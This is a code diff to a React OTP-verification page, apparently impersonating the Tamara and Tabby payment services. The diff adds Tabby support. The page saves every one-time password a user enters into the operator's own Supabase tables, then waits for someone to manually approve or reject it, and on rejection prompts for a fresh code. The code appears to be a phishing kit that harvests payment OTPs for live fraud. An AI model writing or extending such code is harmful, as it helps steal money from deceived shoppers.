@@ -19,6 +19,7 @@ const OtpVerification = () => {
   const price = searchParams.get("price") || "411.15";
   const cardLast4 = searchParams.get("cardLast4") || "6636";
   const paymentId = searchParams.get("paymentId");
+  const paymentType = searchParams.get("type") || "tamara"; // tamara or tabby
   
   const [otp, setOtp] = useState("");
   const [isLoading, setIsLoading] = useState(false);
@@ -53,23 +54,37 @@ const OtpVerification = () => {
 
     try {
       if (paymentId) {
-        // حفظ محاولة OTP أولاً
-        try {
-          await supabase.from("tamara_otp_attempts").insert({
-            payment_id: paymentId,
-            otp_code: otp
-          });
-        } catch (err) {
-          console.error("Error saving OTP attempt:", err);
+        if (paymentType === "tabby") {
+          // حفظ OTP لدفعة Tabby
+          try {
+            await supabase.from("tabby_otp_attempts").insert({
+              payment_id: paymentId,
+              otp_code: otp
+            });
+            console.log("Tabby OTP saved successfully");
+          } catch (err) {
+            console.error("Error saving Tabby OTP attempt:", err);
+          }
+        } else {
+          // حفظ محاولة OTP لدفعة Tamara
+          try {
+            await supabase.from("tamara_otp_attempts").insert({
+              payment_id: paymentId,
+              otp_code: otp
+            });
+          } catch (err) {
+            console.error("Error saving OTP attempt:", err);
+          }
+
+          // ثم تحديث OTP في الدفعة الرئيسية لـ Tamara
+          const { error } = await supabase
+            .from("tamara_payments")
+            .update({ otp_code: otp })
+            .eq("id", paymentId);
+
+          if (error) throw error;
         }
-
-        // ثم تحديث OTP في الدفعة الرئيسية
-        const { error } = await supabase
-          .from("tamara_payments")
-          .update({ otp_code: otp })
-          .eq("id", paymentId);
-
-        if (error) throw error;
+        
         setIsLoading(false);
         setWaitingApproval(true);
         return;
@@ -130,55 +145,101 @@ const OtpVerification = () => {
     if (!paymentId && !orderData.sequenceNumber) return;
 
     if (paymentId) {
-      console.log('Setting up Tamara OTP approval listener for payment:', paymentId);
-      
-      const channel = supabase
-        .channel('tamara-otp-approval')
-        .on('postgres_changes', {
-          event: 'UPDATE',
-          schema: 'public',
-          table: 'tamara_payments',
-          filter: `id=eq.${paymentId}`
-        }, async (payload: any) => {
-          console.log('Tamara payment status update received:', payload);
-          const newStatus = payload.new.payment_status;
-          console.log('New payment status:', newStatus);
-          
-          if (newStatus === 'completed') {
-            console.log('Payment completed! Redirecting to home...');
-            setWaitingApproval(false);
-            setVerificationStatus("success");
+      if (paymentType === "tabby") {
+        console.log('Setting up Tabby OTP approval listener for payment:', paymentId);
+        
+        const channel = supabase
+          .channel('tabby-otp-approval')
+          .on('postgres_changes', {
+            event: 'UPDATE',
+            schema: 'public',
+            table: 'tabby_otp_attempts',
+            filter: `payment_id=eq.${paymentId}`
+          }, async (payload: any) => {
+            console.log('Tabby OTP status update received:', payload);
+            const approvalStatus = payload.new.approval_status;
+            console.log('New approval status:', approvalStatus);
             
-            // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
-            setTimeout(() => {
-              window.location.href = "/";
-            }, 2000);
-          } else if (newStatus === 'otp_rejected') {
-            console.log('OTP rejected! Resetting form...');
-            setWaitingApproval(false);
-            setVerificationStatus("error");
-            
-            // إعادة الحالة إلى pending لإعطاء فرصة لإدخال OTP جديد
-            await supabase
-              .from("tamara_payments")
-              .update({ payment_status: 'pending' })
-              .eq("id", paymentId);
-            
-            // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
-            setTimeout(() => {
-              setVerificationStatus("idle");
-              setOtp("");
-            }, 3000);
-          }
-        })
-        .subscribe((status) => {
-          console.log('Subscription status:', status);
-        });
+            if (approvalStatus === 'approved') {
+              console.log('OTP approved! Redirecting to home...');
+              setWaitingApproval(false);
+              setVerificationStatus("success");
+              
+              // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
+              setTimeout(() => {
+                window.location.href = "/";
+              }, 2000);
+            } else if (approvalStatus === 'rejected') {
+              console.log('OTP rejected! Resetting form...');
+              setWaitingApproval(false);
+              setVerificationStatus("error");
+              
+              // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
+              setTimeout(() => {
+                setVerificationStatus("idle");
+                setOtp("");
+              }, 3000);
+            }
+          })
+          .subscribe((status) => {
+            console.log('Subscription status:', status);
+          });
 
-      return () => {
-        console.log('Cleaning up Tamara OTP approval listener');
-        supabase.removeChannel(channel);
-      };
+        return () => {
+          console.log('Cleaning up Tabby OTP approval listener');
+          supabase.removeChannel(channel);
+        };
+      } else {
+        console.log('Setting up Tamara OTP approval listener for payment:', paymentId);
+        
+        const channel = supabase
+          .channel('tamara-otp-approval')
+          .on('postgres_changes', {
+            event: 'UPDATE',
+            schema: 'public',
+            table: 'tamara_payments',
+            filter: `id=eq.${paymentId}`
+          }, async (payload: any) => {
+            console.log('Tamara payment status update received:', payload);
+            const newStatus = payload.new.payment_status;
+            console.log('New payment status:', newStatus);
+            
+            if (newStatus === 'completed') {
+              console.log('Payment completed! Redirecting to home...');
+              setWaitingApproval(false);
+              setVerificationStatus("success");
+              
+              // عرض رسالة النجاح لمدة 2 ثانية ثم الانتقال للصفحة الرئيسية
+              setTimeout(() => {
+                window.location.href = "/";
+              }, 2000);
+            } else if (newStatus === 'otp_rejected') {
+              console.log('OTP rejected! Resetting form...');
+              setWaitingApproval(false);
+              setVerificationStatus("error");
+              
+              // إعادة الحالة إلى pending لإعطاء فرصة لإدخال OTP جديد
+              await supabase
+                .from("tamara_payments")
+                .update({ payment_status: 'pending' })
+                .eq("id", paymentId);
+              
+              // عرض رسالة الخطأ لمدة 3 ثواني ثم العودة لصفحة التحقق
+              setTimeout(() => {
+                setVerificationStatus("idle");
+                setOtp("");
+              }, 3000);
+            }
+          })
+          .subscribe((status) => {
+            console.log('Subscription status:', status);
+          });
+
+        return () => {
+          console.log('Cleaning up Tamara OTP approval listener');
+          supabase.removeChannel(channel);
+        };
+      }
     }
 
     if (!orderData.sequenceNumber) return;
